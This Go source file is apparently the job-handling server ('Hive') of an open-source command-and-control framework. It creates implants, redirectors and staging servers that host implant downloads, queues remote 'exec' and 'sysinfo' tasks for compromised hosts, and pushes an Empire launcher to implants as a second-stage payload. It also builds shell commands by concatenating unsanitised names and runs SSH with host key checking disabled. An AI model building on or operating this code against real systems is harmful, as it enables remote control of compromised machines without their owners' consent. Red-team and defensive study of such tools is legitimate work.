//{{{{{{{ Hive Jobs Functions }}}}}}}

//// Every command related orders sent to Hive from Clients or console Input and their crafting/process
// A. console
// B. rinteract
// C. binteract
// D. ...

//By Rebujacker - Alvaro Folgado Rueda as an open source educative project

package main

import (

	"log"
	"os"
	"bufio"
	"os/exec"
	"fmt"
	"strings"
	"bytes"
	"time"
	"encoding/json"

)


////Commands JSON, will fit in Job "parameter" field

//CreateImplant
type CreateImplant struct {
    Name string   `json:"name"`
    Ttl string   `json:"ttl"`
    Resptime string   `json:"resptime"`
    Coms string   `json:"coms"`
    ComsParams string `json:"comsparams"`
    Persistence string `json:"persistence"`
    Redirectors  []Red `json:"redirectors"`
}

type Red struct{
    Vps string `json:"vps"`
    Domain string `json:"domain"`
}

//Inject Shell
type InjectEmpire struct {
    Staging string   `json:"staging"`
}

// Drop Implant to Droplet
type DropImplant struct {
	Implant string   `json:"implant"`
    Staging string   `json:"staging"`
    Os string   `json:"os"`
    Arch string   `json:"arch"`
    Filename string   `json:"filename"`
}


//Deletes
type DeleteImplant struct{
    Name string `json:"name"`
}

type DeleteVps struct{
    Name string `json:"name"`
}

type DeleteDomain struct{
    Name string `json:"name"`
}

type DeleteStaging struct{
    Name string `json:"name"`
}


//Implant Checking,future use for gather information of bot
type BiChecking struct{
    Hostname string `json:"hostname"`
}




func jobProcessor(jobO *Job){

	cid := jobO.Cid
	pid := jobO.Pid
	chid := jobO.Chid
	jid := jobO.Jid
	job := jobO.Job
	parameters := jobO.Parameters
	fmt.Println(job+parameters)
	if strings.Contains(pid,"Hive"){

		switch job{
			case "createImplant":

    			jsconcommanA := make([]CreateImplant, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createImplant(Command JSON Decoding Error)")
					return
    			}

				existV,_ := existImplantDB(commandO.Name)
				if existV{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createImplant(Implant "+commandO.Name+" Already exists)")
					return
				}

				errI := createImplant(commandO.Name,commandO.Ttl,commandO.Resptime,commandO.Coms,commandO.ComsParams,commandO.Persistence,commandO.Redirectors)
				if errI != ""{
					removeImplant(commandO.Name)
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createImplant("+errI+")")
					return
				}else{
					setJobStatusDB(jid,"Success")
					setJobResultDB(jid,"Hive-createImplant("+commandO.Name+" created)")
					return
				}
			case "deleteImplant":
				fmt.Println("asdhjasdbjh31")
    			jsconcommanA := make([]DeleteImplant, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createImplant("+commandO.Name+" created)")
					return
    			}
				existI,_ := existImplantDB(commandO.Name)
				if !existI{
					setJobStatusDB(jid,"Error:Hive-deleteImplant(Implant Not in DB)")
					return
				}
				fmt.Println("asdhjasdbjh32")
				err := removeImplant(commandO.Name)
				if err != "Done"{
					setJobStatusDB(jid,"Error:Hive-deleteImplant("+err+")")
					return
				}
				setJobStatusDB(jid,"Success")
				setJobResultDB(jid,"Hive-deleteImplant(Implant "+commandO.Name+" Deleted)")
				return

			case "createVPS":

    			resultA := make([]Vps, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&resultA)
    			result := resultA[0]
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"createVPS(VPS JSON Decoding Error)")
					return
    			}

				existV,_ := existVpsDB(result.Name)
				if existV{
					setJobStatusDB(jid,"Error:createVPS(VPS "+result.Name+" Already exists)")
					return
				}

				addVpsDB(&result)
				setJobStatusDB(jid,"Success")
				setJobResultDB(jid,"createVPS(VPS "+result.Name+" Created)")
				return

			case "deleteVPS":
    			
    			jsconcommanA := make([]DeleteVps, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-deleteVPS(Command JSON Decoding Error))")
					return
    			}

				existV,_ := existVpsDB(commandO.Name)
				if !existV{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-deleteVPS(VPS not in DB)")
					return
				}

				rmVpsDB(commandO.Name)
				setJobStatusDB(jid,"Success")
				setJobResultDB(jid,"Hive-deleteVPS(VPS "+commandO.Name+" Deleted)")
				return

			case "createDomain":
    			
				// JSON parse input
    			resultA := make([]Domain, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&resultA)
    			commandO := resultA[0]
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createDomain(JSON Decoding Error)")
					return
    			}

				existV,_ := existDomainDB(commandO.Name)
				if existV{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createDomain(Domain already exists)")
					return
				}

				addDomainDB(&commandO)
				setJobStatusDB(jid,"Success")
				setJobResultDB(jid,"Hive-createDomain(Domain "+commandO.Name+"Created)")
				return

			case "deleteDomain":
    			
    			jsconcommanA := make([]DeleteDomain, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-deleteDomain(Command JSON Decoding Error)")
					return
    			}

				existV,_ := existDomainDB(commandO.Name)
				if !existV{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-deleteDomain(Domain Exists)")
					return
				}

				rmDomainDB(commandO.Name)
				setJobStatusDB(jid,"Success")
				setJobResultDB(jid,"Hive-deleteDomain(Domain "+commandO.Name+" Deleted)")
				return

			case "createStaging":

    			jsconcommanA := make([]Staging, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createStaging(Command JSON Decoding Error)")
					return
   				}

				existV,_ := existStagingDB(commandO.Name)
				if existV{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createStaging(Staging exists)")
					return
				}

				errI := createStaging(commandO.Name,commandO.Stype,commandO.Parameters,commandO.VpsName,commandO.DomainName)

				if errI != ""{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createStaging(Staging "+errI+" Error)")
					removeStaging(commandO.Name)
					return
				}else{
					setJobStatusDB(jid,"Success")
					setJobResultDB(jid,"Hive-createStaging(Staging "+commandO.Name+" created)")
					return
				}

			case "deleteStaging":
    			
    			jsconcommanA := make([]DeleteStaging, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-deleteStaging(Command JSON Decoding Error)")
					return
    			}

				existI,_ := existStagingDB(commandO.Name)
				if !existI{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-deleteStaging(Staging doesn't exists)")
					return
				}
				removeStaging(commandO.Name)
				setJobStatusDB(jid,"Succes")
				setJobResultDB(jid,"Hive-deleteStaging(Staging "+commandO.Name+" deleted)")
				return

			case "dropImplant":
    			
    			jsconcommanA := make([]DropImplant, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-dropImplant(Command JSON Decoding Error)")
					return
    			}

				existI,_ := existStagingDB(commandO.Staging)
				if !existI{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-dropImplant(Staging doesn't exists)")
					return
				}

				stagingO := getStagingDB(commandO.Staging)
				//fmt.Println(strings.Contains(stagingO.Stype,"droplet"))
				if !strings.Contains(stagingO.Stype,"droplet"){
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-dropImplant(Staging is not a Droplet)")
					return
				}

				var droplet *Droplet
				errD = json.Unmarshal([]byte(stagingO.Parameters), &droplet)
				if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-dropImplant(Problem Decoding Staging Droplet Object Parameters)")
   	 				return
				}
				
				errI := dropImplant(commandO.Implant,commandO.Staging,stagingO.DomainName,droplet.Path,commandO.Os,commandO.Arch,commandO.Filename)
				if errI != ""{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-dropImplant(Drop Implant "+errI+" Error)")
					return
				}else{
					setJobStatusDB(jid,"Success")
					setJobResultDB(jid,"Hive-dropImplant(Drop Implant: "+stagingO.DomainName+":"+droplet.HttpsPort+"/"+droplet.Path+"/"+commandO.Filename+" created)")
					return
				}
			case "createReport":

    			jsconcommanA := make([]Report, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createReport(Command JSON Decoding Error)")
					return
   				}

				existV,_ := existReportDB(commandO.Name)
				if existV{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createReport(Report exists)")
					return
				}

				errI := createReport(commandO.Name)

				if errI != ""{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createReport(Report "+errI+" Error)")
					removeStaging(commandO.Name)
					return
				}else{
					setJobStatusDB(jid,"Success")
					setJobResultDB(jid,"Hive-createReport(Report "+commandO.Name+" created)")
					return
				}

			default:
				setJobStatusDB(jid,"Error")
				setJobResultDB(jid,"Hive-JobNotImplemented")
				return
		}

	}else if strings.Contains(pid,"R-") && strings.Contains(chid,"None"){

		switch job{

			case "log":
   				jsconcommanA := make([]Log, 0)
   				decoder := json.NewDecoder(bytes.NewBufferString(parameters))
   				errD := decoder.Decode(&jsconcommanA)
   				// Error Log
    			if errD != nil {
    				time := time.Now().Format("02/01/2006 15:04:05 MST")
					elog := fmt.Sprintf("Job by "+pid+":Redirector Log(JSON Decoding Error)"+errD.Error())
					addLogDB("Hive",time,elog)
					return
   				}
   				commandO := jsconcommanA[0]
				addLogDB(pid,commandO.Time,commandO.Error)
				return
			default:
				time := time.Now().Format("02/01/2006 15:04:05 MST")
				elog := fmt.Sprintf("Job by "+cid+":Redirector(Job not implemented)")
				addLogDB(pid,time,elog)
		}
	}else if strings.Contains(chid,"B-"){
	
		switch job{

			//Jobs triggered by implants themselves
			case "BiChecking":

   				//BiCHecking is a encoded bot info for future use
   				biChecking(chid,pid,parameters)
				return

			case "BiPing":

				existB,_ := existBiDB(chid)
				if !existB{
					biChecking(chid,pid,parameters)
				}

   				time := time.Now().Format("02/01/2006 15:04:05 MST")
   				setRedLastCheckedDB(pid,time)
   				setBiLastCheckedbyBidDB(chid,time)
   				setBiRidDB(chid,pid)
				return
			case "log":
				
				existB,_ := existBiDB(chid)
				if !existB{
					biChecking(chid,pid,parameters)
				}

   				jsconcommanA := make([]Log, 0)
   				decoder := json.NewDecoder(bytes.NewBufferString(parameters))
   				errD := decoder.Decode(&jsconcommanA)
   				// Error Log
    			if errD != nil {
    				time := time.Now().Format("02/01/2006 15:04:05 MST")
					elog := fmt.Sprintf("Job by "+chid+":Bichito Log(Log JSON Decoding Error)"+errD.Error())
					addLogDB("Hive",time,elog)
					return
   				}
   				commandO := jsconcommanA[0]
				addLogDB(chid,commandO.Time,commandO.Error)

				time := time.Now().Format("02/01/2006 15:04:05 MST")
   				setRedLastCheckedDB(pid,time)
   				setBiLastCheckedbyBidDB(chid,time)
   				setBiRidDB(chid,pid)
				return
				
			// Jobs Triggered by users
			case "exec":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
    			defer jobsToProcess.mux.Unlock()

				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				return

			case "respTime":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
    			defer jobsToProcess.mux.Unlock()

				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				return

			case "ttl":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
    			defer jobsToProcess.mux.Unlock()

				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				return

			case "injectEmpire":

				//Get staging
				//from staging: type,port,domain
    			jsconcommanA := make([]InjectEmpire, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Implant-injectEmpire(Command JSON Decoding Error)")
					return
    			}

    			fmt.Println("Getting Launcher")
				//Generate target shellcode
				error,launcher := getEmpireLauncher(commandO.Staging,chid)
    			if error != "" {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Implant-injectEmpire(Generate Launcher error):"+error)
					return
    			}

				jobO.Parameters = launcher
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
    			defer jobsToProcess.mux.Unlock()
    			fmt.Println("Sending Launcher")
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				return
			case "sysinfo":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
    			defer jobsToProcess.mux.Unlock()
    			
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				return
			default:
				time := time.Now().Format("02/01/2006 15:04:05 MST")
				elog := fmt.Sprintf("Job by "+cid+":Bichito(Job not implemented)")
				addLogDB(pid,time,elog)
		}

	}
}

func getEmpireLauncher(stagingName string,bid string) (string,string){

	//var sysinfo string
	var outbuf,errbuf bytes.Buffer
	
	//TO-DO:get OS for Linux vs Windows
	//sysinfo = getBiInfoDB(bid)
	//sysinfoO := jsconcommanA[0]

	//De-serialize paramters
	//jsconcommanA := make([]SysInfo, 0)
	//decoder := json.NewDecoder(bytes.NewBufferString(sysinfo))
	//errD := decoder.Decode(&jsconcommanA)
	// Error Log
	//if errD != nil {
	//	return "Implant-injectEmpire(SysInfo JSON Decoding Error)"+ errD.Error(),""
	//}

	//TO-DO: Adapt to get it on windows as well
	//Read Launcher Saved on Empire Staging Creation
	launchertxtpath := "/usr/local/STHive/stagings/"+stagingName+"/pythonLauncher"
	
	cmd_path := "/bin/sh"
	cmd := exec.Command(cmd_path, "-c","cat "+launchertxtpath)
	cmd.Stdout = &outbuf
	cmd.Stderr = &errbuf
	cmd.Run()
	cmd.Wait()
	if errbuf.String() != "" {
		return "Error Getting Empire Launcher:"+errbuf.String(),""
	}


	return "",outbuf.String()

}

func biChecking(chid string,pid string,parameters string){

	redirectorId,_ := getRedIdbyRidDB(pid)
	implantId,_ := getImplantIdbyRidDB(pid)
	timeNow := time.Now().Format("02/01/2006 15:04:05 MST")
	implantName,_ := getImplantNamebyIdDB(implantId)
	_,implant := getImplantDB(implantName)
	addBiDB(chid,pid,parameters,timeNow,implant.Ttl,implant.Resptime,"Online",redirectorId,implantId)
	setRedLastCheckedDB(pid,timeNow)	

}

func createStaging(stagingName string,stype string,parameters string,vpsName string,domainName string) string{

	var errbuf bytes.Buffer
	//Check existence, and validity of provided implant,vps and domains
	//Implant exist

	extvps,_ := existVpsDB(vpsName)
	extdomain,_ := existDomainDB(domainName)
	usedDomain,_ := isUsedDomainDB(domainName)

	if (!extvps && !extdomain && usedDomain){
		elog := fmt.Sprintf("%s","StagingGeneration(NotExisting VPS/Domain,UsedDomain,DB-Error)")
		return elog
	}

	//Create Folder
	stagingFolder := "/usr/local/STHive/stagings/"+stagingName

	mkdir := exec.Command("/bin/sh","-c","mkdir "+stagingFolder)
	mkdir.Stderr = &errbuf
	mkdir.Start()
	mkdir.Wait()
	mkdirErr := errbuf.String()

	if (mkdirErr != ""){
		//ErrorLog
		errorT := mkdirErr
		elog := fmt.Sprintf("%s%s","StagingGeneration(Folder Creation):",errorT)
		return elog
	}

	//Get not used Random TCP Port [0-65535]
	errPort,tunnelPort := getStagingTunnelPortDB() 
	if (errPort != nil){
		//ErrorLog
		errorT := errPort
		elog := fmt.Sprintf("%s%s","StagingGeneration(TunnelPort Choosing):",errorT)
		return elog
	}


	infraResult := generateStagingInfra(stagingName,stype,tunnelPort,parameters,vpsName,domainName)

	//If fails destroy possible created infra and folder
	if infraResult != "Done" {
		
		destroyStagingInfra(stagingName)
		mkdir := exec.Command("/bin/sh","-c","rm -r "+stagingFolder)
		mkdir.Start()
		mkdir.Wait()
		return infraResult
	}
	
	setUsedDomainDB(domainName,"Yes")

    vpsId,_ := getVpsIdbyNameDB(vpsName)
    domainId,_ := getDomainIdbyNameDB(domainName)

	addStagingDB(stagingName,stype,tunnelPort,parameters,vpsId,domainId)

	return ""

}

func removeStaging(stagingName string) string{

	//Remove infra, if sucessful, remove DB row
	result := destroyStagingInfra(stagingName)
	mkdir := exec.Command("/bin/sh","-c","rm -r /usr/local/STHive/stagings/"+stagingName)
	mkdir.Start()
	mkdir.Wait()
	dname,_,_ := getDomainNbyStagingNameDB(stagingName)
	setUsedDomainDB(dname,"No")
	rmStagingDB(stagingName)
	return result
}

func createReport(reportName string) string{

	var report,implantH string
	var bids []string
	//Get DB Data
	err,jobs := getJobsDB()
	err,implants := getImplantsNameDB()
	err,stagings := getStagingsNameDB() 

	if err != nil {
		return err.Error()
	}

	//Header
	report =
		fmt.Sprintf(
		`
		Report: %s

		`,reportName)

	//Set a timestamp
	time := time.Now().Format("02/01/2006 15:04:05 MST")
	timeS :=
		fmt.Sprintf(
		`
		Creation Time: %s

		`,time)

	report = report + timeS

	hiveJH :=
		fmt.Sprintf(
		`
		Hive Jobs:

		`)

	report = report + hiveJH
	//Hive Jobs and Logs
	for _,job := range jobs{
		if (job.Pid == "Hive"){
			report = report + fmt.Sprintf(
			`
			%s | %s | %s | %s

			%s

			%s

			`,job.Cid,job.Job,job.Time,job.Status,job.Parameters,job.Result)

		}
	}

	//Per implant jobs and logs
	for _,implant := range implants{
		implantH =
			fmt.Sprintf(
			`
			Implant < %s > Jobs:

			`,implant)
		report = report + implantH
		err,bids = getBidsImplantDB(implant)
		if err != nil {
			return err.Error()
		}
		for _,bid := range bids{
			for _,job := range jobs{
				if (job.Chid == bid){
					report = report + fmt.Sprintf(
					`
					%s | %s | %s | %s

					%s

					%s

					`,job.Cid,job.Job,job.Time,job.Status,job.Parameters,job.Result)
				}
			}
		}
	}
	//Go over Stagings and pull interactive data
	var errS,interactiveS string
	for _,staging := range stagings{

		errS,interactiveS = getStagingLog(staging)
		if errS != ""{
			return errS
		}

		report = report + fmt.Sprintf(
		`
		Staging < %s > interactive session:

		%s

		`,staging,interactiveS)
	}

	//Save crafted string on DB

	fmt.Println(report)
	err = addReportDB(reportName,report)
	if err != nil {
		return err.Error()
	} 
	
	return ""
}

func getStagingLog(stagingName string) (string,string){

	//Get Domain
	domain,err,err2 := getDomainbyStagingDB(stagingName)
	domainName,err,err2 := getDomainNbyStagingNameDB(stagingName)
	if (err != nil) || (err2 !=nil){
		return err.Error()+err2.Error(),""
	}

	//Craft Keypath with Domain Name

	keypath := "/usr/local/STHive/stagings/"+stagingName+"/"+domainName+".pem"

	var outbuf,errbuf bytes.Buffer
	interactiveS :=  exec.Command("/bin/sh","-c", "ssh -oStrictHostKeyChecking=no -i "+keypath+" ubuntu@"+domain+" /bin/cat /home/ubuntu/*.log")
	interactiveS.Stdout = &outbuf
	interactiveS.Stderr = &errbuf
	
	interactiveS.Start()
	interactiveS.Wait()

	//if (errbuf.String() != ""){
	//	return "Error Getting Staging Logs"+errbuf.String(),""
	//}

	//REsult will be stdout,if stderr return error
	return "",outbuf.String()

}


func addUser(username string,password string) string{

	genId := fmt.Sprintf("%s%s","C-",randomString(8))
	err := addUserDB(genId,username,password)
	if err != nil {return "User Exists!"}
	return "Done!"

}





//// Basic Built-In Server Console
// 


func console(){

	var (

		exit bool 			   = false
		prompt string 		   = "[STConsole]> "
		scanner *bufio.Scanner = bufio.NewScanner(os.Stdin)
		)
		os.Stdout.Write([]byte(prompt))

		// keep scanning input for commands once \n pressed
		for scanner.Scan() {
			command := scanner.Text()
			log.Printf(command)
			if len(command) > 1 {
				argv := strings.Split(command, " ") // argument spaces
				switch argv[0]{

					case "getfingenprint":

						var outbuf,errbuf bytes.Buffer
						hivSign := exec.Command("/bin/sh","-c", "openssl x509 -fingerprint -sha256 -noout -in /usr/local/STHive/certs/hive.pem | cut -d '=' -f2")
						hivSign.Stdout = &outbuf
						hivSign.Stderr = &errbuf
						hivSign.Start()
						hivSign.Wait()
						fmt.Println(strings.Split(outbuf.String(),"\n"))

					case "adduser":
						if len(argv) < 3 {
							fmt.Println("Not enough params\n")
							continue
						}					
						fmt.Println(addUser(argv[1],argv[2]))

					case "exit":
						exit = true
					default:
						fmt.Println("help")
				}
				if exit {
					break
				}
			}
			os.Stdout.Write([]byte(prompt))
		} 
}